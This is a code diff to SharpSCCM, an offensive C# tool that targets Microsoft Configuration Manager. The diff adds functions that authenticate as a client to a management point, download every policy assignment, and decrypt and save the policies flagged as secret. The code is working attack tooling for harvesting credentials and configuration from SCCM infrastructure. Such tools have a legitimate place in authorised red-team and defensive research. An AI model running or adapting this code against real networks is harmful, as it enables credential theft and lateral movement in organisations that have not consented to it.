@@ -6,6 +6,7 @@ using System.Security.Cryptography;
 using System.Security.Cryptography.Pkcs;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using System.Threading.Tasks;
 using System.Xml;
 
 // Configuration Manager SDK
@@ -283,6 +284,125 @@ namespace SharpSCCM
                 // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
                 Console.WriteLine("[+] Encrypted hex strings can be decrypted offline using the \"DeobfuscateSecretString.exe <string>\" command");
             }
+        }
+
+        public static void GetPolicies(string managementPoint, string siteCode, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string outputDir = null)
+        {
+            // Same registration/auth flow as GetSecretsFromPolicies, but fetches every policy assignment instead of only ones flagged "Secret"
+            (MessageCertificateX509 signingCertificate, MessageCertificateX509 encryptionCertificate, SmsClientId clientId) = GetCertsAndClientId(managementPoint, siteCode, encodedCertificate, providedClientId, username, password, registerClient);
+
+            if (signingCertificate != null && encryptionCertificate != null && clientId != null)
+            {
+                ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, signingCertificate, managementPoint, siteCode);
+
+                if (!string.IsNullOrEmpty(outputDir) && !Directory.Exists(outputDir))
+                {
+                    Directory.CreateDirectory(outputDir);
+                }
+
+                foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
+                {
+                    // Block until each policy is fully downloaded/parsed/written before moving to the next one;
+                    // GetPolicy is async (it awaits the HTTP body read), and this loop is not, so without this
+                    // the loop would race ahead into the next policy before the current one finishes.
+                    GetPolicy(policyAssignment, managementPoint, clientId, encryptionCertificate, signingCertificate, outputDir).GetAwaiter().GetResult();
+                }
+            }
+        }
+
+        public static async Task GetPolicy(PolicyAssignment policyAssignment, string managementPoint, SmsClientId clientId, MessageCertificateX509 encryptionCertificate, MessageCertificateX509 signingCertificate, string outputDir = null)
+        {
+            bool isSecretPolicy = policyAssignment.Policy.Flags.ToString().Contains("Secret");
+
+            Console.WriteLine($"[+] Found policy{(isSecretPolicy ? " containing secrets" : string.Empty)}:");
+            Console.WriteLine($"      ID: {policyAssignment.Policy.Id}");
+            Console.WriteLine($"      Flags: {policyAssignment.Policy.Flags}");
+            Console.WriteLine($"      URL: {policyAssignment.Policy.Location.Value}");
+
+            HttpResponseMessage policyDownloadResponse = null;
+            try
+            {
+                string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
+                policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId, signingCertificate);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[!] An exception occurred while trying to download policy {policyAssignment.Policy.Id}: {ex.Message}");
+                return;
+            }
+
+            if (policyDownloadResponse == null)
+            {
+                return;
+            }
+
+            byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
+            Console.WriteLine($"[+] Received {policyDownloadResponseBytes.Length} byte response from server for policy {policyAssignment.Policy.Id}");
+
+            string policyBody;
+            if (isSecretPolicy)
+            {
+                try
+                {
+                    policyBody = DecryptPolicyBody(policyDownloadResponseBytes, encryptionCertificate);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[!] An exception occurred while trying to decrypt policy {policyAssignment.Policy.Id}: {ex.Message}");
+                    return;
+                }
+            }
+            else
+            {
+                // Policies not flagged "Secret" are returned in plaintext rather than CMS-enveloped, so no decryption step is required.
+                // UTF-8 (not ASCII) since we have no guarantee the response is ASCII-only; UTF-8 decodes plain ASCII identically.
+                policyBody = Encoding.UTF8.GetString(policyDownloadResponseBytes).Replace("\0", string.Empty);
+            }
+
+            if (string.IsNullOrEmpty(policyBody))
+            {
+                return;
+            }
+
+            XmlDocument policyXmlDoc = new XmlDocument();
+            try
+            {
+                policyXmlDoc.LoadXml(TrimToXmlStart(policyBody));
+            }
+            catch (XmlException ex)
+            {
+                Console.WriteLine($"[!] An exception occurred while trying to parse policy {policyAssignment.Policy.Id} as XML: {ex.Message}");
+                return;
+            }
+            try
+            {
+                Helpers.DecompressXMLNodes(policyXmlDoc);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[!] An exception occurred while trying to decompress policy {policyAssignment.Policy.Id}: {ex.Message}");
+                return;
+            }
+
+            if (!string.IsNullOrEmpty(outputDir))
+            {
+                string safePolicyId = string.Join("_", policyAssignment.Policy.Id.Split(Path.GetInvalidFileNameChars()));
+                string outputFile = Path.Combine(outputDir, $"{safePolicyId}.xml");
+                File.WriteAllText(outputFile, policyXmlDoc.OuterXml);
+                Console.WriteLine($"[+] Wrote policy {policyAssignment.Policy.Id} to {outputFile}");
+            }
+            else
+            {
+                Console.WriteLine(policyXmlDoc.OuterXml);
+            }
+        }
+
+        // Server responses (CMS-decrypted or plaintext) sometimes carry a couple of leading garbage/BOM bytes before the XML declaration
+        private static string TrimToXmlStart(string rawBody)
+        {
+            string trimmed = rawBody.Trim();
+            int startIndex = trimmed.IndexOf('<');
+            return startIndex > 0 ? trimmed.Substring(startIndex) : trimmed;
         }
 
         public static MessageCertificateX509 LocalSmsEncryptionCertificate()
